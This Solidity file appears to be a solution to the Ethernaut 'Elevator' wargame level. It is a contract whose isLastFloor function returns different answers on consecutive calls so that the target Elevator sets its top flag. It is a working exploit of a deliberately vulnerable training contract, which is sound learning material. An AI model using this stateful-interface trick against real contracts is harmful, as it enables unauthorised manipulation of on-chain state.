// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
    function floor() external returns (uint256);
    function top() external returns (bool);
}
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Cracked11_Elevator is Building {
    address ethernaut_contracts;

    constructor(address _address) {
        ethernaut_contracts = _address;
    }
    function goTo(uint256 _floor) public {
        IElevator(ethernaut_contracts).goTo(_floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (IElevator(ethernaut_contracts).floor() == 200) {
            return true;
        }

        return false;
    }
}
